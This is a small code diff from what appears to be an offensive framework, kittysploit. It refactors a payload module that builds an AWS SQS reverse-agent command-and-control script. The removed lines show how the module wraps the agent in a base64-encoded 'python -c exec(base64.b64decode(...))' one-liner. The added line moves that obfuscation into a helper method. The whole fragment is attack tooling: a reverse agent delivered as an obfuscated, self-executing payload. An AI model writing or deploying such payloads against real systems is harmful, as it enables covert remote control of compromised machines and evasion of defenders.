@@ -1,5 +1,4 @@
 from kittysploit import *
-import base64
 
 from lib.c2.aws_sqs_reverse_agent import build_aws_sqs_reverse_agent_script
 
@@ -50,6 +49,4 @@ class Module(Payload):
 			poll_interval=float(getattr(getattr(self, "poll_interval", None), "value", self.poll_interval) or 2),
 			use_base64=bool(getattr(getattr(self, "use_base64", None), "value", self.use_base64)),
 		)
-		encoded = base64.b64encode(script.encode("utf-8")).decode("ascii")
-		py = str(self.python_binary)
-		return f'{py} -c "import base64;exec(base64.b64decode(\'{encoded}\').decode())"'
+		return self._encode_python_one_liner(script, self.python_binary)
